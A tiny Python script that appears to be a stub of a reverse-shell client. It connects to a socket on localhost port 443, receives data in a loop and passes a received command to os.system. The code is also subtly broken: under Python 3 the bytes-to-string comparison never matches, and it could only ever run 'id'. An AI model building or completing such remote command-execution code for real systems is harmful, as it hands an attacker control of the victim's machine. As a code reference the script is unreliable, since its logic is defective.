import os
import sys
import socket
import time

host = "127.0.0.1"
port = 443


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))



while True:
    time.sleep(1)
    read = s.recv(1024)
    if read == 'id':
        os.system(read)
